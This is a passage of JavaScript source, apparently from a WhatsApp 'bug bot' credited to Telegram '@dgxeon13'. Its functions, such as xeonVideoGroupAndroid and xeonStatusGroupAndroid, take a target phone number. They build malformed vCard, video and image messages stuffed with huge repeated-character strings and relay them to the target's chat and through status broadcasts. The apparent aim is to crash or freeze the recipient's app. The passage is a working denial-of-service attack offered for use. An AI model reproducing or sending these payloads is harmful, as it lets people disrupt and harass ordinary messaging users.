@dgxeon13${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:Telegram: @dgxeon13${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
                    contextInfo: {
                        participant: target,
                        externalAdReply: {
                            automatedGreetingMessageShown: true,
                            automatedGreetingMessageCtaType: "".repeat(100000),
                            greetingMessageBody: ""
                        }
                    }
                }
            }, {});

            await sock.relayMessage(target, {
                groupStatusMessageV2: {
                    message: msg.message,
                }
            }, {
                messageId: msg.key.id,
                participant: { jid: target }
            });

            await sleep(5000);

            await sock.relayMessage("status@broadcast", msg2.message, {
                messageId: msg2.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: "meta",
                    attrs: {},
                    content: [{
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{
                            tag: "to",
                            attrs: { jid: target },
                            content: undefined
                        }]
                    }]
                }]
            });

            console.log(chalk.green(`cantsee sent to ${target}`));

        }
    } catch (error) {
        // Silent to avoid console spam (your original had console.log(error))
    }
}

async function xeonVideoGroupAndroid(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

   const msg = generateWAMessageFromContent(target, {
            "videoMessage": {
                "url": "https://mmg.whatsapp.net/v/t62.7161-24/543199275_1336265302028190_4715543992707240244_n.enc?ccb=11-4&oh=01_Q5Aa4gHWEmAgjdS6NVDveKsc9Bik4LLuOdsM9AnjMOuUphQgCg&oe=6A2A90A6&_nc_sid=5e03e0&mms3=true",
                "mimetype": "video/mp4",
                "fileSha256": "0gdawTQq+DubtM+QlIJeUQ6RdigyYd/6D/AGBy6+uBY=",
                "fileLength": "950123",
                "seconds": 12,
                "mediaKey": "x0FmT9Coe4dj7a3BzdjLOxJCuCdn+PhFVMiFSqnrE/s=",  
                "gifPlayback": false,
                "caption": "Telegram: @dgxeon13"+ "ꦾ".repeat(60000),
                "height": 576,
                "width": 576,
                "fileEncSha256": "k1Ykf6WNVE9FJDenQNBxr33In9fq9JlfIdOq8XoejN4=",
                "directPath": "/v/t62.7161-24/543199275_1336265302028190_4715543992707240244_n.enc?ccb=11-4&oh=01_Q5Aa4gHWEmAgjdS6NVDveKsc9Bik4LLuOdsM9AnjMOuUphQgCg&oe=6A2A90A6&_nc_sid=5e03e0",
                "mediaKeyTimestamp": "1778585856",
                "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAAAwIEBQEGAQADAQEAAAAAAAAAAAAAAAAAAgMBBP/aAAwDAQACEAMQAAAAxDkFqxsJYWrde6u18v0Eg80agyZnXqW03LtCutotYSnDgIIGbjkJMNtVZi6rlPVp9Km5XIk753F8tGyyu0TbaqavzK0MhKcAKVOhXlsTAzZmCt3GBGUAvX//xAAjEAEAAgIBBAIDAQAAAAAAAAABAAIDESEEEjFBECITQlGR/9oACAEBAAE/AAIW51L1lfUqTFUdM6un0I0T1ElhNfG90mMWVEmMUn4xTv5l8OK36zq+la23QjW2tspQTcKiJKUCYwfJNIcTZsIpL5zuag7l6GppK8ShoCUrKV8f2HM7Oe6bQ5g465e+bf7CDMaemYxnBqG2Ogl8Lbbbj4GHdMNm2TTMdYUjM2bsQl7qcsf9JV3Nla79zpK7ssozmbtzM1t3tFuwu1IXnqdPdpaU8Tu0S9radTIrZnDCr7YaHxuHjbMQ1yD63BJsltFZ1P1sagLzqf/EAB0RAAICAgMBAAAAAAAAAAAAAAABESECEBIgUUH/2gAIAQIBAT8AiT4MTgkWUrqlukc/BJ7mSvBbwtsbs//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQMVESEyH/2gAIAQMBAT8AJUtzhDihp4n6JzieWsYMAJM9XcuQVtQoj3LBDWlKAET/2Q==",
                "contextInfo": {
                    "remoteJid": "status@broadcast",
                    "pairedMediaType": "NOT_PAIRED_MEDIA"
                },
                "streamingSidecar": "zI7jhC/hNrAwAfLqMTEHl2rNMtnmHWbMdlEvgi0k5SW5fMUNNkhwSvJTbP4JKPUXQP5bKJ1V5T3UKaxnsxj5ZfUis85g3+rN1xxQ0GLP5P2BTUYu31ZIR+7JuaMmi5/f+0VXR+h2Lw8L1mkNBNLubNL7IDsFPvfCae9HyrgpqSvUlQppZRyTTNiZRRGksDtUtj7LzYYC",
                "gifAttribution": "NONE",
                "viewOnce": false,
                "annotations": [{
                    "polygonVertices": [{
                            "x": 0.25,
                            "y": 0.4155234396457672
                        },
                        {
                            "x": 0.75,
                            "y": 0.4155234396457672
                        },
                        {
                            "x": 0.75,
                            "y": 0.5836874842643738
                        },
                        {
                            "x": 0.25,
                            "y": 0.5836874842643738
                        }
                    ],
                    "shouldSkipConfirmation": true,
                    "embeddedContent": {
                        "embeddedMusic": {
                            "musicContentMediaId": "806119065866333",
                            "songId": "1137812656623908",
                            "author": "cu".repeat(200002),
                            "title": "cu",
                            "artworkDirectPath": "/v/t61.89441-24/595437186_731840673341902_1266462731933211674_n.enc?ccb=11-4&oh=01_Q5Aa4gGVOUtWMjbELz41CC6Hq7KB65m4UQ1Ok_J4Onvo7RgRZQ&oe=69C77E6D&_nc_sid=5e03e0",
                            "artworkSha256": "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
                            "artworkEncSha256": "r9BWAOUfrDCnp3bn+/bzOx1A966Z3CSpnemr24FtaV0=",
                            "artistAttribution": "lwlal",
                            "countryBlocklist": "UlU=",
                            "isExplicit": true,
                            "artworkMediaKey": ""
                        }
                    },
                    "embeddedAction": true
                }],
                "processedVideos": [{
                    "quality": "UNDEFINED",
                    "capabilities": [
                        "webp", "gif", "jpeg", "png", "pdf", "doc", "xls", "ppt", "zip", "rar", "7z", "txt", "csv", "mp3", "ogg", "wav", "flac", "aac", "opus"
                    ]
                }]
            }
        }, {
            userJid: target,
            quoted: null
        });
      await userSock.relayMessage(target, {
    videoMessage: msg.message.videoMessage
         }, {
            messageId: msg.key.id
        });
    console.log(chalk.green(`androgc sent to ${target}`));
  } catch (err) {
  console.error(`Error in androgc for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonStatusGroupAndroid(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

   const msg = generateWAMessageFromContent(target, {
            imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQNNxtLDhOE_UqOlLGHxav4CxUAuJH3JfX5163fu1PIb4nhK6btWIrDPHtKIvFujp-70Y95AYKirJYm5zc-5D96FTe-kxfvaWoymfubxWA?ccb=9-4&oh=01_Q5Aa4gE8rFbtZRw-MdGWI-dsItlhlZPImqSSlbptHAi4bwgnbQ&oe=6A2A4D8F&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "3GeamT+XY2YtD2skRVN8VMrLQUesGdicz26kcqyXaTA=",
        fileLength: "11828",
        caption: "test",
        height: 297,
        width: 550,
        mediaKey: "wnS/19PaGu0KEOnCRDKd2EhvmFYwaGjBAB5gRypcQSE=",
        fileEncSha256: "qhQPCa9sC4W10w/GhgSoHY8yZbjDdcL9mzONlZKbxa0=",
        directPath: "/o1/v/t24/f2/m269/AQNNxtLDhOE_UqOlLGHxav4CxUAuJH3JfX5163fu1PIb4nhK6btWIrDPHtKIvFujp-70Y95AYKirJYm5zc-5D96FTe-kxfvaWoymfubxWA?ccb=9-4&oh=01_Q5Aa4gE8rFbtZRw-MdGWI-dsItlhlZPImqSSlbptHAi4bwgnbQ&oe=6A2A4D8F&_nc_sid=e6ed6c",
        mediaKeyTimestamp: "1778576219",
        jpegThumbnail: "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